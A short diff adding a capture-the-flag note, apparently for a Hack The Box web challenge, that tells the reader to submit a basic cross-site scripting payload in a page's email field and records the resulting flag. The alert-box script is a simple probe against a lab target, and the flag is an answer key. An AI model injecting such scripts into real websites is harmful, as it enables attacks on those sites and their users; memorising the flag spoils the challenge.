@@ -1,0 +1,10 @@
+access: http://159.65.81.48:30470/
+
+take attention input field on email end of web page below.
+simple xss script:
+<script>alert("XSS")</script>
+result:
+HTB{p0p..p0p..p0p...alert(1337)}
+
+resource:
+https://jammy.gitbook.io/jammy-ramblings-and-notes/writeups/hack-the-box/challenges/web/full-stack-conf
